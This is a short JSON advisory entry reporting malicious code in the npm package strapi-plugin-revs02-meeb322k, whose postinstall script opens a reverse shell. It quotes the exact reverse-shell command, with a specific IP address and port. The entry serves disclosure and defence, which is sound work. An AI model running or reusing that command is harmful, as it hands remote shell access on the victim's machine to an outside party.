  "summary": "Malicious code in strapi-plugin-revs02-meeb322k (npm)",
  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (5b50be7098a50f4a7fc673fdffe7a06ab9ce182fdca04a8ee9cd448f66c9a6b1)\nThe package declares scripts.postinstall pointing at postinstall.js, whose top-level code executes `bash -c 'bash -i \u003e /dev/tcp/14.225.210.85/443 0\u003e\u00261'`, opening an interactive reverse shell from the installer's host to 14.225.210.85:443 on `npm install`. A marker file is written to /tmp to confirm execution. The package description self-identifies as a reverse-shell payload for Strapi.\n",
